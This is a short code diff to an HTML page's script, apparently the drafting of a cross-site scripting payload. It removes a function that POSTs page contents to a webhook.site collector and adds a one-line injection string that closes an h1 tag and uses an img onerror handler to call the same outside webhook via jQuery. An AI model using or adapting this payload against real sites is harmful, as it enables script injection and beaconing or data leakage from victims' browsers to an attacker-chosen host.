@@ -8,20 +8,8 @@
 <body>
   <p>"DATA"</p>
   <script>
-    // Function to create a script tag with a POST request
-    function createScriptWithPostRequest() {
-      var method = "POST";
-      var url = "https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e";
-      var body = JSON.stringify({
-        Contents: 'document.body.innerHTML'
-      });
-      var headers = {
-        "Content-type": "application/json; charset=UTF-8",
-        "mode": "no-cors"
-      };
 
-      var fetchString = fetch("' + url + '", {method: "' + method + '", body: ' + body + ', headers: ' + JSON.stringify(headers) + '})
-      var XSS = '<img src="adfdsa" onerror=' + fetchString + '/>';
+      var XSS = '</h1><img src="adfdsa" href=1 onerror="(function(){$.get(\'https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e\')})()">';
 
       document.title = XSS;
 
